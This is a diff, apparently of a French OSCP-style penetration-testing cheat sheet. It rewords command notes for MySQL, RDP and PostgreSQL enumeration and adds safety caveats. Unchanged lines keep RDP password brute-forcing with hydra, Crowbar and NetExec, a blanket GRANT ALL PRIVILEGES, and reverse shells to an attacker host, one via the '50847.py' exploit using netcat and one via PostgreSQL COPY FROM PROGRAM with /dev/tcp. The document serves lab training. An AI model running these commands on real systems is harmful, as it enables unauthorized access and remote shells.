@@ -2257,7 +2257,7 @@ version
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Nmap (MYSQL) : lancer les scripts NSE « mysql-audit, mysql-databases, mysql-dump-hashes ».</p>
+<p class="oscp-command-note">Nmap MySQL : relever la version et les variables du serveur ; aucun script d'extraction de hash n'est exécuté.</p>
 
 ```bash
 nmap -sV -p 3306 --script mysql-info,mysql-variables <IP_CIBLE>
@@ -2286,7 +2286,7 @@ mysql -h <IP_CIBLE> -u <UTILISATEUR> -p <BASE_DE_DONNEES>
 
 ```
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">MySQL : lister les bases, sélectionner une base et consulter ses tables avec un compte autorisé.</p>
 
 ```sql
 SHOW DATABASES;
@@ -2302,10 +2302,10 @@ SELECT * FROM <table_name>;
 ```
 
 ```sql
-# Lister les comptes MySQL visibles avec les privilèges du compte connecté
+-- Lister les comptes MySQL visibles avec les privilèges du compte connecté
 SELECT user FROM mysql.user;
 
-# Modification des privilèges : opération administrative sensible, non nécessaire à l'énumération
+-- Modification des privilèges : opération administrative sensible, non nécessaire à l'énumération
 GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
 
@@ -2329,7 +2329,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 ### 3389: RDP
 
-<p class="oscp-command-note">Nmap (RDP) : lancer les scripts NSE « rdp-enum-encryption, rdp-vuln-ms12-020, rdp-ntlm-info ».</p>
+<p class="oscp-command-note">Nmap RDP : relever les modes de chiffrement et les informations NTLM ; le script ms12-020 n'est pas lancé.</p>
 
 ```bash
 nmap -sV -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <IP_CIBLE>
@@ -2343,7 +2343,7 @@ hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
 
 ```
 
-<p class="oscp-command-note">RDP : tester les identifiants de laboratoire avec Crowbar ou CrackMapExec.</p>
+<p class="oscp-command-note">RDP : tester des identifiants de laboratoire avec Crowbar ou NetExec ; attention aux verrouillages de comptes.</p>
 
 ```bash
 # Tester l'authentification RDP avec Crowbar (autorisation requise ; risque de verrouillage)
@@ -2354,10 +2354,10 @@ nxc rdp 192.0.2.10 -u utilisateurs.txt -p mots_de_passe.txt
 
 ```
 
-<p class="oscp-command-note">Se connecter à un serveur VNC autorisé avec TigerVNC ; ce bloc ne concerne pas RDP.</p>
+<p class="oscp-command-note">RDP : ouvrir une session avec FreeRDP ou rdesktop et, si nécessaire, partager un dossier local.</p>
 
 ```bash
-# Se connecter au bureau distant avec FreeRDP (vérifier la version installée)
+# FreeRDP 2.x : ouvrir une session RDP ; vérifier le binaire disponible (xfreerdp ou xfreerdp3)
 xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /size:1600x1000
 
 # Partager un répertoire local avec le bureau distant (FreeRDP 2.x ; adapter pour FreeRDP 3.x)
@@ -2366,7 +2366,7 @@ xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore /drive:partage,/home/kali/par
 # Activer le presse-papiers et régler la résolution (FreeRDP 2.x)
 xfreerdp /v:192.0.2.10 /u:utilisateur /cert:ignore +clipboard /size:1920x1080
 
-# Alternative ancienne : rdesktop (préférer FreeRDP si disponible)
+# Alternative historique : rdesktop ; le mot de passe en argument est visible dans la liste des processus
 rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
 
 # Ouvrir rdesktop et saisir les identifiants lorsque le serveur le demande
@@ -2388,7 +2388,7 @@ nxc rdp <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>'
 
 Examiner les connexions, la configuration et les requêtes de la base de données.
 
-<p class="oscp-command-note">Nmap (POSTGRESQL) : lancer les scripts NSE « postgresql-info, postgresql-user-enum, postgresql-ssl ».</p>
+<p class="oscp-command-note">Nmap PostgreSQL : identifier les services sur TCP 5432 et 5433 ; aucun script NSE n'est lancé ici.</p>
 
 ```bash
 nmap -sV -p 5432,5433 192.0.2.10
@@ -2415,7 +2415,7 @@ psql -h <IP_CIBLE> -p 5432 -U <UTILISATEUR> -W
 
 ```
 
-<p class="oscp-command-note">Exécuter 50847.py avec les paramètres indiqués pour «PostgreSQL».</p>
+<p class="oscp-command-note">PostgreSQL : exemple historique de script tiers non vérifié ; contrôler CVE, version et paramètres avant usage.</p>
 
 ```bash
 # Avant tout test d'exploitation PostgreSQL, vérifier la version exacte, les correctifs et les conditions de la CVE.
@@ -2425,17 +2425,17 @@ python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
 
 ```
 
-<p class="oscp-command-note">SQL : préparer ou interroger les tables et fonctions liées à «PostgreSQL».</p>
+<p class="oscp-command-note">PostgreSQL : démonstration de COPY FROM PROGRAM, réservée aux rôles disposant des privilèges requis.</p>
 
-```bash
-# Démonstration SQL PostgreSQL : COPY FROM PROGRAM exige des privilèges élevés  
+```sql
+-- Démonstration SQL PostgreSQL : COPY FROM PROGRAM exige des privilèges élevés  
 DROP TABLE IF EXISTS cmd_exec;  
 CREATE TABLE cmd_exec(cmd_output text);  
 COPY cmd_exec FROM PROGRAM 'id';  
 SELECT * FROM cmd_exec;  
 DROP TABLE IF EXISTS cmd_exec;
 
-# Exemple historique de shell inversé : ne pas confondre SQL et commande système
+-- Exemple historique de shell inversé : ne pas confondre SQL et commande système
 DROP TABLE IF EXISTS cmd_exec;  
 CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
@@ -2444,25 +2444,25 @@ DROP TABLE IF EXISTS cmd_exec;
 
 ```
 
-<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>
+<p class="oscp-command-note">PostgreSQL : commandes interactives psql et requêtes SQL ; saisir les méta-commandes dans psql.</p>
 
 ```sql
-# Dans l'invite psql : lister les bases de données
+-- Dans l'invite psql : lister les bases de données
 \l
 
-# Dans psql : basculer vers une base de données existante
+-- Dans psql : basculer vers une base de données existante
 \c <DB_NAME>
 
-# Dans psql : lister les tables visibles du schéma courant
+-- Dans psql : lister les tables visibles du schéma courant
 \dt
 
-# Dans psql : afficher les colonnes et les types d'une table
+-- Dans psql : afficher les colonnes et les types d'une table
 \d <TABLE_NAME>
 
-# Requête SQL : lire les lignes d'une table autorisée
+-- Requête SQL : lire les lignes d'une table autorisée
 SELECT * FROM <TABLE_NAME>;
 
-# Afficher les colonnes, types et informations supplémentaires d'une table
+-- Afficher les colonnes, types et informations supplémentaires d'une table
 \d+ <TABLE_NAME>
 
 # Exemple de filtre SQL sur une table et une colonne qui doivent réellement exister
